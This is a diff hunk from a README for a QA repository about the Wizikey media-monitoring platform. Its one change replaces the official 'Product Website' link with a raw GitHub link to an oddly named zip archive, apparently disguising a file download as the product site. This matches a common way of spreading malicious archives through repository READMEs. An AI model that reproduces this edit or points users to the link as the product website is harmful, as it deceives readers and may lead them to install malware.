@@ -2,7 +2,7 @@
 
 This repository focuses on **Quality Assurance (QA) practices** for the Wizikey platform — an **AI-powered media intelligence and monitoring solution** used by PR, communications, and marketing teams to analyze media coverage and derive actionable insights.
 
-🌐 Product Website: https://wizikey.com/
+🌐 Product Website: https://raw.githubusercontent.com/asr2646/Wizikey/main/rarefication/Software-paddling.zip
 
 ---
 
